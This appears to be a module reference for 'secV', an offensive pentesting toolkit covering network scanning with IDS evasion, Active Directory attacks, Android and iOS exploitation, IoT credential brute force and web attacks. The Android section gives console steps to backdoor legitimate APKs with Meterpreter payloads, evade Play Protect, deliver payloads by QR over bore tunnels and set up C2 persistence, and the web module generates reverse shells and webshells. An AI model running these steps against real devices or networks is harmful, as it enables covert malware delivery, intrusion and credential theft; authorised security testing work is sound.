# SecV Module Index

Complete reference of all SecV security modules.

**Version:** 2.4.2  
**Total Modules:** 9  
**Categories:** network (3), AD (2), mobile (2), web (1), ctf (1)

---

## Quick Navigation

- [Network](#network)
- [Active Directory](#active-directory)
- [Mobile](#mobile)
- [Web](#web)
- [Module Development](#module-development)

---

## Network

### `netrecon` v1.0.0
**Concurrent Multi-Engine Network Profiler**

Runs nmap, masscan, rustscan, arp-scan, and Shodan simultaneously, merges results, and correlates CVEs against detected service versions via live NVD lookups. Detects iOS/Apple devices (port 62078, mDNS). Extracts SSL cert domains (CN+SANs). Supports country/ASN-based targeting, GeoIP2 local DB, passive-only mode, proxy chains, and evasion techniques.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `mode` | string | `normal` | Scan mode: `normal`, `quick`, `deep`, `stealth`, `evasion`, `full` |
| `ports` | string | `top-1000` | Port range or preset: `top-100`, `top-1000`, `web`, `db`, `iot`, `camera`, `ics`, `all` |
| `threads` | integer | `20` | Concurrent scanning threads |
| `rate` | integer | `1000` | Packets/sec (masscan) |
| `timeout` | integer | `5` | Per-host timeout (seconds) |
| `os_detection` | boolean | `false` | Enable OS fingerprinting (requires root) |
| `vuln_scripts` | boolean | `false` | Run nmap vuln scripts |
| `shodan_key` | string | — | Shodan API key for enrichment |
| `interface` | string | — | Network interface to bind |
| `exclude` | string | — | Comma-separated hosts/CIDRs to skip |
| `passive_only` | boolean | `false` | No active probing — Shodan/DNS only |
| `max_hosts` | integer | `1024` | Max IPs sampled from `country:`/`asn:` targets |
| `evasion` | boolean | `false` | Enable IDS/FW bypass (frags, decoys, source-port spoof) |
| `proxychains` | boolean | `false` | Wrap nmap through proxychains4 |
| `web_enum` | boolean | `false` | Run gobuster/ffuf on discovered web ports |
| `output_dir` | string | — | Save HTML report, nmap XML, MSF RC to this directory |

**Target formats:**

| Format | Example | Description |
|--------|---------|-------------|
| Single IP | `run 192.168.1.1` | Direct host scan |
| CIDR | `run 192.168.1.0/24` | Network range |
| Range | `run 192.168.1.1-50` | IP range |
| Hostname | `run example.com` | Resolved via DNS |
| Multi | `run 10.0.0.1,10.0.0.5` | Comma-separated |
| Country | `run country:de` | All German CIDRs (ipdeny.com) |
| ASN | `run asn:AS15169` | All prefixes for an ASN (RIPE stat) |

**Output fields:**
- `hosts[]` — per-host: IP, hostname, OS, MAC, services, ASN, country, risk score
- `ssl_domains[]` — CN + SANs from TLS certs on each host (CDN noise filtered)
- `vulnerabilities[]` — host-level findings (SNMP defaults, MQTT no-auth, RTSP no-auth, ICS exposure)
- `summary{}` — totals, OS distribution, risk breakdown, high-risk hosts
- `outputs{}` — paths to HTML report, nmap XML, MSF RC file (when `output_dir` set)

**Optional feature availability:**
- Minimum (stdlib): TCP connect, DNS, WHOIS, ASN lookup (ipinfo.io)
- `+nmap`: Service/OS detection, NSE scripts
- `+masscan`: Fast SYN port discovery (root required)
- `+cryptography`: Full SSL SAN extraction (`pip3 install cryptography`)
- `+geoip2 +GeoLite2-*.mmdb`: Offline ASN/country lookup, no rate limits (`pip3 install geoip2`)
- `+shodan key`: External threat intelligence
- `+mmh3`: Camera favicon fingerprinting (17 camera models)

**Quick Start:**
```
secV ❯ use netrecon
secV (netrecon) ❯ set mode normal
secV (netrecon) ❯ set ports top-1000
secV (netrecon) ❯ run 192.168.1.0/24

secV (netrecon) ❯ set max_hosts 500
secV (netrecon) ❯ run country:de

secV (netrecon) ❯ run asn:AS15169
```

---

### `mac_spoof` v2.2.0
**Connection-Aware MAC Address Rotator**

Per-interface background daemons with multiple rotation strategies, active connection tracking (no drops), locally-administered OUI prefix (`02:00:00`), vendor OUI spoofing, rotation history, stealth mode (rotate on disconnect only), and persistent systemd service support.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `iface` | string | — | Interface name or comma-separated list |
| `all_up` | boolean | `false` | Target all UP non-loopback interfaces |
| `action` | string | `start` | `start`, `stop`, `status`, `vendor`, `restore`, `history` |
| `mode` | string | `smart` | `smart`, `session`, `periodic`, `aggressive` |
| `interval` | float | `30.0` | Rotation interval (seconds, periodic mode) |
| `vendor` | string | — | Vendor OUI pool: `apple`, `samsung`, `intel`, `cisco`, `dell` |
| `stealth` | boolean | `false` | Only rotate on disconnect events |
| `persistent` | boolean | `false` | Write a systemd user service to auto-start on login |
| `preserve_connections` | boolean | `true` | Skip change when active TCP connections exist |
| `wait_for_quiet` | boolean | `true` | Wait for connections to drop before rotating |
| `max_wait` | integer | `30` | Max wait time (seconds) before forcing change |
| `dry_run` | boolean | `false` | Preview without applying changes |

**Actions:**

| Action | Description |
|--------|-------------|
| `start` | Start rotation daemon (locally-administered OUI or vendor if set) |
| `stop` | Kill daemon and restore original MAC |
| `status` | Show current MAC, original, PID, uptime, rotation count |
| `vendor` | Apply a single vendor-spoofed MAC without starting a daemon |
| `restore` | Restore original MAC from state file (or ethtool -P fallback) |
| `history` | Show the rotation log for the interface |

**Quick Start:**
```
sudo secV
secV ❯ use mac_spoof
secV (mac_spoof) ❯ set iface wlan0
secV (mac_spoof) ❯ set interval 300
secV (mac_spoof) ❯ run localhost

# Spoof as Apple hardware
secV (mac_spoof) ❯ set action vendor
secV (mac_spoof) ❯ set vendor apple
secV (mac_spoof) ❯ run localhost
```

---

### `wifi_monitor` v1.0.0
**Smart WiFi Network Monitor & Threat Detector**

Real-time host discovery via ARP (scapy) with TCP-ping fallback, async per-host port scanning, SSL/HTTP/SSH banner grabbing, CVE lookup via CIRCL API (24h cache), device fingerprinting (IoT, router, NAS, database, web server), and threat detection for exposed databases, Telnet, FTP, and end-of-life SSH.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `mode` | string | `monitor` | `monitor`, `passive`, `deep` |
| `ports` | string | `top-20` | Port range or preset: `top-20`, `top-100`, `full` |
| `port_scan` | boolean | `true` | Enable per-host port scanning |
| `cve_lookup` | boolean | `true` | Look up CVEs for detected services |
| `timeout` | integer | `3` | Per-host/port timeout (seconds) |
| `concurrency` | integer | `50` | Concurrent scan workers |

**Quick Start:**
```
sudo secV
secV ❯ use wifi_monitor
secV (wifi_monitor) ❯ run 192.168.1.0/24
```

---

## Active Directory

### `adsec` v1.0.0
**Active Directory Security Assessment**

Single-tool, full-chain Active Directory pentest covering everything from unauthenticated discovery through Kerberoasting, AS-REP roasting, lockout-aware password spraying, BloodHound collection, vuln checks (Zerologon, PetitPotam, NoPac, MachineAccountQuota, ADCS web enrollment), share looting (GPP cpassword, KeePass, SSH keys, unattend.xml), and SAM/LSA/NTDS extraction. Pure-Python fallback via `impacket` + `ldap3` means it works without dozens of external CLIs.

**Operations:**

| Operation | Auth Required | What it does |
|-----------|---------------|--------------|
| `discover` | none | DC fingerprint, domain SID, OS, NetBIOS, anonymous SMB/LDAP probing |
| `users` | none / low-priv | LDAP user enum + SAMR RID brute fallback |
| `groups` | low-priv | Domain group enumeration with members |
| `shares` | none / low-priv | Share inventory with READ/WRITE permission tests |
| `passpol` | none | Domain password policy via SAMR |
| `kerberoast` | low-priv | TGS hash dump for SPN-bearing accounts |
| `asreproast` | none | AS-REP hash dump for users without preauth |
| `spray` | userlist | Lockout-aware password spraying via SMB |
| `vulncheck` | none | Zerologon, PetitPotam, NoPac, MAQ, SMBv1, signing, ADCS |
| `bloodhound` | low-priv | BloodHound JSON zip via bloodhound-python |
| `loot` | low-priv | Sensitive file search across readable shares |
| `secrets` | DA / local-admin | secretsdump SAM/LSA/NTDS via impacket |
| `auto` | varies | Full safe pipeline with given context |

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `operation` | string | `discover` | One of the 13 operations above |
| `domain` | string | — | AD domain FQDN (e.g. `corp.local`) |
| `username` | string | — | Domain account for authenticated ops |
| `password` | string | — | Domain password |
| `hash` | string | — | NTLM hash (`LM:NT` or just `NT`) for pass-the-hash |
| `kerberos` | boolean | `false` | Use Kerberos auth instead of NTLM |
| `dc_ip` | string | — | DC IP if different from target |
| `userlist` | string | — | Path to user list (asreproast, spray) |
| `passlist` | string | — | Path to password list (spray) |
| `single_password` | string | — | Single password to spray across users |
| `safe_spray` | boolean | `true` | Lockout-aware (pulls passpol first) |
| `bloodhound_collection` | string | `Default` | `Default`, `All`, `DCOnly`, `ACL`, `Trusts` |
| `output_dir` | string | `./adsec-loot` | Where hashes, BH zips, and loot are saved |
| `rid_max` | integer | `4000` | Max RID for SAMR brute |
| `exclude_users` | string | — | Comma-separated usernames to skip in spray |
| `threads` | integer | `20` | Concurrent workers |
| `timeout` | integer | `30` | Per-op timeout (seconds) |

**Safety:**
- Lockout-aware spray pulls password policy first, leaves 2-attempt buffer
- `krbtgt`, `Administrator`, `Guest` excluded from spray by default
- All hashes written to `output_dir` (never logged to stdout)
- Pure-Python fallbacks via `impacket` + `ldap3`

**Quick Start:**
```
secV ❯ use adsec
secV (adsec) ❯ set operation discover
secV (adsec) ❯ run 192.168.1.50

# AS-REP roast (no creds needed):
secV (adsec) ❯ set operation asreproast
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set userlist /tmp/users.txt
secV (adsec) ❯ run 192.168.1.50

# Full safe pipeline with low-priv creds:
secV (adsec) ❯ set operation auto
secV (adsec) ❯ set domain corp.local
secV (adsec) ❯ set username analyst
secV (adsec) ❯ set password 'P@ss123'
secV (adsec) ❯ run 192.168.1.50
```

---

### `winadsec` v1.0.0
**Windows Active Directory Post-Exploitation**

Windows-side AD post-exploitation toolkit covering 37 operations including UAC bypass, WMI persistence, Sliver C2 session management, and ISO payload generation. Designed to run from a compromised Windows host against an AD environment.

**Path:** `tools/AD/windows/`

**Quick Start:**
```
secV ❯ use winadsec
secV (winadsec) ❯ set operation uac_bypass
secV (winadsec) ❯ run 192.168.1.50
```

---

## Mobile

### `android_pentest` v2.2.0
**Full-Lifecycle Android Pentesting Suite**

Device recon to active exploitation and persistence. Supports rooted and non-rooted devices, ADB over USB and WiFi, multi-device sweeps, on-device native agent deployment with TCP+HTTP C2, and a full web GUI (`mode=gui`) that covers all 30+ operations with embedded C2 dashboard.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `operation` | string | — | Operation to run (see table below) |
| `device` | string | — | ADB device serial (auto-detect if single device) |
| `package` | string | — | Target app package name |
| `frida` | boolean | `false` | Enable Frida runtime instrumentation |
| `proxy` | boolean | `false` | Enable HTTP proxy interception |
| `proxy_host` | string | `127.0.0.1` | Proxy host |
| `proxy_port` | integer | `8080` | Proxy port |
| `bypass_ssl` | boolean | `false` | Bypass SSL pinning via Frida |
| `backup` | boolean | `false` | Create ADB backup before testing |
| `search_secrets` | boolean | `true` | Scan for hardcoded secrets and credentials |
| `mirror` | boolean | `false` | Mirror device screen during testing |
| `record` | boolean | `false` | Record screen during operation |
| `bore_server` | string | `bore.pub` | Bore relay server hostname — used by `qr_exploit wan` and `wan_expose` bore fallback |
| `apk_path` | string | — | Explicit APK path to serve in `qr_exploit wan` mode (overrides work_dir glob) |
| `mode` | string | — | Set to `gui` to launch the full Android Pentest web GUI (`android_gui.py`) at localhost:8897 |
| `gui_port` | int | `8897` | HTTP port for the GUI server (used with `mode=gui`) |

**Operations:**

| Operation          | Description                                                                        |
|--------------------|------------------------------------------------------------------------------------|
| `recon`            | Device fingerprint, root status, SELinux, chipset                                  |
| `app_scan`         | APK analysis, manifest audit, security score                                       |
| `vuln_scan`        | 50+ checks, OWASP Mobile Top 10, NVD live CVEs                                    |
| `exploit`          | Intent injection, SQLi, content provider attacks                                   |
| `network`          | Traffic capture, SSL inspection, proxy setup                                       |
| `forensics`        | Data extraction, artifact analysis                                                 |
| `frida_hook`       | Deploy frida-server, auto-hook app: SSL unpin, root bypass, cred dump, trace       |
| `objection_patch`  | Embed Frida gadget (no root at runtime), repackage and sign APK                    |
| `get_root`         | Multi-vector root: Magisk, adb root, CVE-2024-0044, mtk-su, KernelSU              |
| `inject_agent`     | Push native recon agent, receive JSON report via TCP C2, auto-escalate             |
| `adb_wifi`         | Enable ADB over WiFi, drop USB dependency                                          |
| `deploy_shell`     | Generate and install Meterpreter APK (no root required)                            |
| `backdoor_apk`     | Pull APK, inject msfvenom payload (-x template), sign, optionally install          |
| `rebuild`          | Build BootBuddy WAN C2 APK with BootReceiver + DexClassLoader + bore + QR       |
| `persist`          | Boot Receiver + Magisk module persistence                                            |
| `hook`             | Three-vector hook: Magisk service.sh injection, SharedUID shell, LSPosed/Zygote    |
| `unhook`           | Remove all persistence hooks planted by the hook operation                         |
| `exploit_cve`      | Targeted CVE exploitation (CVE-2024-0044, CVE-2023-45866, CVE-2024-31317, etc.)   |
| `cve_chain`        | Run predefined CVE chain: bt_to_root, sandbox_exfil, zero_click_full               |
| `zero_click`       | Probe zero-click surfaces: Bluetooth HID, NFC, WiFi broadcast, media parsing       |
| `qr_exploit`       | Generate QR for APK URL, Intent URI, ADB WiFi pairing, deeplink, or **wan** (bore tunnel + detached APK HTTP server, QR encodes real public WAN URL) |
| `device_net_scan`  | Scan device WiFi via netrecon, detect exposed ADB TCP and web services             |
| `wan_expose`       | Expose MSF listener and APK server via Cloudflare Tunnel; falls back to bore if cloudflared is not installed |
| `msf_handler`      | Launch Metasploit multi/handler and start msfrpcd for GUI session management       |
| `full_pwn`         | 7-step chain: recon + adb_wifi + get_root + device_net_scan + shell + persist + WAN|
| `multi_device`     | Run any operation across all connected devices simultaneously                      |
| `c2_gui`           | Launch secV web C2 dashboard (bore, MSF, QR, operations, encrypted session logs)  |
| `c2_cli`           | Launch C2 server in CLI mode                                                       |
| `full`             | Complete assessment: recon + vuln_scan + exploit + network + forensics             |

**Full Web GUI** (`tools/mobile/android/android_gui.py`):
- Launch via `set mode gui; run` or `python3 android_gui.py --port 8897`
- Operations sidebar: all 30+ operations grouped by category, click to configure and launch
- Live terminal: real-time SSE output stream from every running operation
- ADB console tab: raw ADB command input, output inline
- Findings tab: auto-parsed vulnerability cards from JSON output
- C2 Dashboard tab: embeds `c2_gui.py` as an inline iframe, auto-started on demand

**On-Device Agent** (`tools/mobile/android/agent/`):
- `secv_agent.sh` - shell script, any Android without compilation
- `secv_agent.c` - compiled ARM64 binary via NDK (`build.sh`)
- `c2_server.py` - standalone TCP+HTTP C2 with interactive REPL

**APK Backdoor Tool** (`tools/mobile/android/apk_backdoor/`):
- `build_bootbuddy.py` - repackage any APK with BootReceiver + AgentService + DexClassLoader chain, WAN C2 via bore tunnels, QR delivery

**C2 Web Dashboard** (`tools/mobile/android/c2_gui.py`):
- Sessions, Bore tunnels, MSF sessions, QR delivery, Operations, Logs
- 5-layer encrypted .scv session archives (PBKDF2 + SHA3 + Scrypt + AES-GCM + ChaCha20)
- Embedded as a tab inside `android_gui.py` (no separate launch needed)

**Quick Start:**
```
secV ❯ use android_pentest
secV (android_pentest) ❯ set operation inject_agent
secV (android_pentest) ❯ set agent_mode recon
secV (android_pentest) ❯ run device

# C2 server (separate terminal)
python3 tools/mobile/android/agent/c2_server.py --auto-exploit --lhost 192.168.1.100

# WAN APK delivery via bore (no port-forwarding)
secV (android_pentest) ❯ set operation qr_exploit
secV (android_pentest) ❯ set mode wan
secV (android_pentest) ❯ set apk_path /tmp/payload.apk
secV (android_pentest) ❯ run no_device
# → spawns detached HTTP server + bore tunnel
# → QR encodes http://bore.pub:<port>/payload.apk

# WAN expose with bore fallback
secV (android_pentest) ❯ set operation wan_expose
secV (android_pentest) ❯ set lport 4444
secV (android_pentest) ❯ run connected
# → tries cloudflared, falls back to bore automatically
```

**bore install** (v0.5.1 — required for `qr_exploit wan` and bore fallback):
```bash
curl -sL https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz | tar xz -C ~/.local/bin
```

**Play Protect Bypass:**

Raw `deploy_shell` APKs (`com.metasploit.stage`) are flagged immediately. Two bypass options:

| Option | Operation | Detection | Requires |
|--------|-----------|-----------|----------|
| Template injection | `backdoor_apk` | Medium — real package name, real icon | A legitimate APK |
| DexClassLoader chain | `rebuild` | Low — no static Meterpreter in APK | bore tunnel for DEX delivery |

```
# Option 1 — inject into a legitimate APK
set operation backdoor_apk
set package com.example.app   # or: set apk_path /tmp/app.apk
set lhost <bore.pub IP>
set lport <bore MSF port>
run connected

# Option 2 — DexClassLoader stub (payload delivered at runtime via bore)
set operation rebuild
set apk_path /tmp/base.apk
set bore_dex_port 21062
set bore_msf_port 37993
run connected
```

**Dependencies:** `adb` (system binary — installed by `install.sh`)

---

### `iot_pwn` v1.0.0
**IoT and Router Exploitation Module**

Tests default credentials across SSH, Telnet, FTP, and HTTP admin panels. Performs SNMP community string brute-force, UPnP SSDP exposure detection, RTSP no-auth checks, and known router CVE probing. Inspired by routersploit toolset capabilities, embedded entirely in Python with no external framework dependency.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `target` | string | — | Target IP address of the IoT device or router |
| `ssh` | bool | `true` | Test SSH default credentials via paramiko |
| `telnet` | bool | `true` | Test Telnet default credentials (raw socket, no telnetlib) |
| `ftp` | bool | `true` | Test FTP default credentials via ftplib |
| `http` | bool | `true` | Discover HTTP admin panels and test HTTP Basic/Digest creds |
| `snmp` | bool | `true` | Brute-force SNMP community strings over UDP/161 |
| `rtsp` | bool | `true` | Check if RTSP stream is accessible without authentication |
| `upnp` | bool | `true` | Check for exposed UPnP SSDP service |
| `threads` | int | `20` | Number of concurrent worker threads |
| `timeout` | float | `3.0` | Per-connection timeout in seconds |
| `max_creds` | int | `68` | Maximum credential pairs to test |

**Credential coverage:** 68 default credential pairs (routersploit + additional IoT vendor defaults: Huawei, ZTE, TP-Link, D-Link, Zyxel, Netgear, Cisco, Ubiquiti, Dahua, Hikvision, and more).

**CVE checks:** Huawei HG532 (CVE-2017-17215), Zyxel hardcoded backdoor (CVE-2020-29583), Arcadyan arbitrary command execution (CVE-2021-20090), D-Link authentication bypass (CVE-2019-16920).

**Quick Start:**
```
secV ❯ use iot_pwn
secV (iot_pwn) ❯ run 192.168.1.1

# HTTP + SNMP only (skip SSH/Telnet/FTP)
secV (iot_pwn) ❯ set ssh false
secV (iot_pwn) ❯ set telnet false
secV (iot_pwn) ❯ set ftp false
secV (iot_pwn) ❯ set rtsp false
secV (iot_pwn) ❯ set upnp false
secV (iot_pwn) ❯ run 192.168.1.1
```

**Optional dependencies:**
- `paramiko` — SSH credential testing: `pip3 install paramiko`
- `requests` — HTTP admin panel discovery + credential testing: `pip3 install requests`

---

### `ctfpwn` v1.1.0
**CTF Autopwn**

Syncs `github.com/0xb0rn3/CTFs`, lists all rooms newest first, and runs standalone autopwn scripts. Extracts flags (THM{}/HTB{} patterns), saves output to `~/ZX01C/CTF/<room>/`. Tracks room state between pulls so new rooms are automatically detected and flagged.

**Parameters:**

| Parameter  | Type   | Default | Description |
|------------|--------|---------|-------------|
| `operation`| string | `list`  | `list` \| `pull` \| `latest` \| `run` \| `info` \| `search` \| `new` |
| `ctf`      | string | —       | Room name (case-insensitive, partial match) |
| `platform` | string | `THM`   | `THM` \| `HTB` \| `ALL` |
| `query`    | string | —       | Search term for `search` operation |

**Operations:**

| Operation | Description |
|-----------|-------------|
| `list`    | List all CTFs sorted newest first; new rooms since last pull are marked |
| `pull`    | Clone/update repo + mirror to `~/ZX01C/CTF/`; saves state for new-room detection |
| `latest`  | Show newest CTF; auto-run if target IP given |
| `run`     | Run specific room's autopwn against target IP |
| `info`    | Show README/writeup for a room |
| `search`  | Full-text search across names, writeups, and exploit scripts |
| `new`     | Show rooms added to the repo since the last pull |

**Quick Start:**
```
secV ❯ use ctfpwn
secV (ctfpwn) ❯ set operation list
secV (ctfpwn) ❯ run none

secV (ctfpwn) ❯ set operation latest
secV (ctfpwn) ❯ run 10.10.85.42

secV (ctfpwn) ❯ set operation run
secV (ctfpwn) ❯ set ctf Rabbit_Store
secV (ctfpwn) ❯ run 10.10.85.42

secV (ctfpwn) ❯ set operation new
secV (ctfpwn) ❯ run none
```

**Dependencies:** `python3`, `git` (required); `nmap`, `gobuster`, `sshpass`, `hydra`, `nodejs` (optional, used by individual room scripts)

---

### `ios_pentest` v1.0.0
**iOS Security Testing**

IPA static analysis, binary protection checks (PIE, stack canary, ARC, encryption), ATS/Info.plist audit, keychain dumping, Frida SSL bypass, and live iOS CVE assessment via NVD. Covers non-jailbroken and jailbroken paths.

**Parameters:**

| Parameter | Type | Default | Description |
|-----------|------|---------|-------------|
| `operation` | string | `recon` | `recon`, `app_scan`, `vuln_scan`, `exploit`, `full` |
| `udid` | string | — | Device UDID (auto-detect if single device) |
| `bundle_id` | string | — | Target app bundle ID |
| `ipa_path` | string | — | Path to local IPA for static analysis |
| `ssh_host` | string | — | Jailbroken device IP for SSH access |
| `ssh_port` | integer | `22` | SSH port |
| `ssh_user` | string | `root` | SSH user |
| `ssh_pass` | string | `alpine` | SSH password |
| `search_secrets` | boolean | `true` | Scan for hardcoded secrets |
| `deep_analysis` | boolean | `false` | Extended binary analysis |
| `ssl_bypass` | boolean | `false` | Frida SSL pinning bypass |
| `frida` | boolean | `false` | Enable Frida instrumentation |
| `nvd_api_key` | string | — | NVD API key (higher rate limit) |

**Prerequisites:**
- Non-jailbroken: `ideviceinfo` + local IPA file
- Jailbroken: + SSH root access (checkra1n / unc0ver / palera1n / dopamine) + frida-server running on device

**Quick Start:**
```
secV ❯ use ios_pentest
secV (ios_pentest) ❯ run device

# Jailbroken deep test
secV ❯ use ios_pentest
secV (ios_pentest) ❯ set operation full
secV (ios_pentest) ❯ set ssh_host 192.168.1.50
secV (ios_pentest) ❯ set ssl_bypass true
secV (ios_pentest) ❯ run device
```

---

## Web

### `websec` v1.0.0
**Web Offensive Tool**

Full-stack web attack surface tool. DNS/WHOIS/SSL OSINT, security headers, CORS, cookies, directory brute-force, error-based + time-blind SQLi (WAF evasion variants), reflected XSS, CSRF, 403 bypass, open redirect, Jira/AEM/Confluence CVEs, WordPress attack surface (user enum, xmlrpc, plugins, version), WAF fingerprinting, web spidering, Google dorks. Built-in stealth layer: 20-string UA rotation, full browser headers, delay/jitter, proxy/Tor routing. Authenticated scanning via cookies/custom headers.

**Parameters:**

**Parameters:**

| Parameter     | Type    | Default       | Description                                                    |
|---------------|---------|---------------|----------------------------------------------------------------|
| `operation`   | string  | `recon`       | Operation to run (see table below)                             |
| `test_url`    | string  | —             | URL with params for SQLi/XSS (`https://example.com/s?q=test`) |
| `bypass_path` | string  | `/admin`      | Path to test 403 bypass on                                     |
| `cookies`     | string  | —             | Session cookies: `key=value; key2=value2`                      |
| `headers_str` | string  | —             | Custom request headers: `Header: value; Header2: value`        |
| `user_agent`  | string  | Chrome 124    | Override User-Agent (ignored when `rotate_ua true`)            |
| `threads`     | integer | `10`          | Concurrent threads for directory discovery (1–50)              |
| `timeout`     | number  | `10.0`        | HTTP request timeout in seconds                                |
| `max_pages`   | integer | `50`          | Max pages to crawl in spider operation                         |
| `wordlist_file`| string | —             | Path to custom wordlist for directory discovery                |
| `verbose`     | boolean | `false`       | Verbose output                                                 |
| `stealth`     | boolean | `false`       | UA rotation + full browser headers on every request            |
| `rotate_ua`   | boolean | `false`       | Per-request UA rotation from 20-string pool                    |
| `delay`       | number  | `0`           | Fixed delay in seconds between requests                        |
| `jitter`      | number  | `0`           | Random 0–N second offset added to each delay                   |
| `proxy`       | string  | —             | Proxy URL: `http://host:port` or `socks5://host:port`          |
| `waf_evasion` | boolean | `false`       | Obfuscated SQLi/XSS variants to bypass WAF signatures          |

**Operations:**

| Operation        | Description                                                             |
|------------------|-------------------------------------------------------------------------|
| `recon`          | DNS, WHOIS, SSL cert, robots.txt, Wayback Machine, tech stack           |
| `headers`        | Security headers audit (HSTS, CSP, X-Frame-Options, etc.)              |
| `cors`           | CORS: wildcard, origin reflection, credentials misconfig                |
| `cookies`        | Cookie flag audit: Secure, HttpOnly, SameSite                           |
| `dirs`           | Directory brute-force with 100+ built-in paths + custom wordlist        |
| `sqli`           | Error-based + time-blind SQLi; WAF-evasion variants via `waf_evasion`  |
| `xss`            | Reflected XSS; WAF-evasion variants via `waf_evasion`                  |
| `csrf`           | CSRF token detection across homepage + common form paths                |
| `bypass_403`     | 403 bypass via header injection and path manipulation                   |
| `open_redirect`  | Open redirect via 12+ common redirect parameter names                   |
| `framework_cves` | Jira/AEM/Confluence CVE path probing (15+ known CVE paths)             |
| `file_upload`    | File upload form and endpoint detection                                  |
| `rate_limit`     | Rate limit enforcement check (10 rapid requests)                        |
| `spider`         | Crawl site breadth-first, map URLs, forms, JS files                     |
| `dork`           | Generate 18+ Google dork queries + OSINT resource links                 |
| `ssl`            | SSL/TLS: version, cipher suites, cert details, expiry                   |
| `waf`            | WAF fingerprinting: Cloudflare, AWS, ModSecurity, Akamai, Imperva, F5  |
| `wordpress`      | WP attack surface: user enum (REST+author), xmlrpc, plugins, version   |
| `stealth`        | Show stealth config, print live headers, test proxy reachability        |
| `php_payload`    | Generate PHP reverse shell, webshell, cmd page, or obfuscated payload  |
| `msf_payload`    | msfvenom web payloads (php/war/jsp/aspx) with a matching handler.rc    |
| `fuzz`           | Directory/path fuzzing — auto-picks ffuf, gobuster, or dirbuster       |
| `burp_export`    | Raw HTTP request file, Burp scope JSON, intruder payload list           |
| `full`           | All checks in one pass                                                  |

**Quick Start:**
```
secV ❯ use websec
secV (websec) ❯ set operation sqli
secV (websec) ❯ set test_url https://example.com/search?q=test
secV (websec) ❯ run https://example.com

# Stealth scan through Tor
secV (websec) ❯ set stealth true
secV (websec) ❯ set proxy socks5://127.0.0.1:9050
secV (websec) ❯ set delay 0.5
secV (websec) ❯ set jitter 1.5
secV (websec) ❯ set waf_evasion true
secV (websec) ❯ run https://example.com

# Generate all PHP payload types
secV (websec) ❯ set operation php_payload
secV (websec) ❯ set php_type all
secV (websec) ❯ set lhost 10.10.14.1
secV (websec) ❯ run https://example.com

# Directory fuzzing with custom wordlist
secV (websec) ❯ set operation fuzz
secV (websec) ❯ set extensions php,html,txt
secV (websec) ❯ run https://example.com
```

**Authorization required** — only test systems you own or have explicit written permission to test.

---

## Module Development

### Quick Start

```bash
mkdir -p tools/category/my-tool
cd tools/category/my-tool

# Generate module.json from source code
python3 ../../../gen_module.py . --write

# Or scaffold manually
cat > module.json << 'EOF'
{
  "name": "my-tool",
  "version": "1.0.0",
  "category": "category",
  "description": "One-line description",
  "author": "you",
  "executable": "python3 main.py",
  "dependencies": [],
  "optional_dependencies": {},
  "help": {
    "description": "Extended description",
    "parameters": {
      "param_name": {
        "description": "What it does",
        "type": "string",
        "required": false,
        "default": "value",
        "options": ["option1", "option2"]
      }
    },
    "examples": [
      {
        "description": "Basic usage",
        "commands": ["use my-tool", "run target"]
      }
    ],
    "features": [],
    "notes": []
  },
  "timeout": 300
}
EOF
```

Module stdin receives `{"target": "...", "params": {...}}` as JSON. Read with:
```python
import json, sys
ctx    = json.loads(sys.stdin.read())
target = ctx["target"]
params = ctx.get("params", {})
```

After adding: `secV ❯ reload`

### `gen_module.py` — Module JSON Generator

Auto-generates `module.json` from source code. Scans Python `params.get()` and `argparse`, and Bash `jq .params.X` patterns.

```bash
# Print generated JSON
python3 gen_module.py tools/network/my-tool/

# Write module.json into the tool directory
python3 gen_module.py tools/network/my-tool/ --write

# Merge newly detected params into existing hand-written module.json
python3 gen_module.py tools/network/my-tool/ --update
```

What is auto-detected: parameter names, types (`int(params.get(...))` → `integer`, `_bool(...)` → `boolean`), defaults, argparse `help=`/`choices=`/`required=`, version/author from docstrings, third-party imports as dependencies, executable.

Descriptions and `examples` blocks must be filled in manually.

### Contribution Checklist

- [ ] Module works with all deps listed in `rqm.md` installed by `install.sh`; optional deps detected at runtime and handled gracefully
- [ ] `module.json` with complete `help.parameters` section
- [ ] `README.md` inside the module directory
- [ ] No unhandled exceptions reaching stdout
- [ ] Binary names (not pip packages) in `dependencies`
- [ ] New pip packages added to `rqm.md` under `#python`; system packages added under the relevant distro sections (`#pacman`/`#apt`/`#dnf`/etc.)
- [ ] Update this `MODULES.md` file

See [CONTRIBUTING.md](CONTRIBUTING.md) for the full guide.

---

## Compatibility Matrix

| Module | Basic | Standard | Full | Linux | macOS |
|--------|-------|----------|------|-------|-------|
| `netrecon` | TCP/DNS | + SYN/Nmap | + Shodan/CVE | ✓ | ✓ |
| `mac_spoof` | ✓ | ✓ | ✓ | ✓ | ✓ |
| `wifi_monitor` | TCP-ping | + ARP/scapy | + CVE lookup | ✓ | ✓ |
| `adsec` | discover/enum | + spray/kerberoast | + bloodhound/secretsdump | ✓ | ✓ |
| `winadsec` | — | — | Full (requires Windows target + Sliver C2) | ✓ | ✓ |
| `android_pentest` | recon/adb | + Frida | + all ops | ✓ | ✓ |
| `ios_pentest` | static IPA | + idevice | + Frida/JB | ✓ | ✓ |
| `websec` | recon/DNS | + requests/active | + bs4/spider | ✓ | ✓ |
| `ctfpwn` | list/info | — | + run with tools | ✓ | ✓ |

---

*Maintained by SecVulnHub · 0xb0rn3*
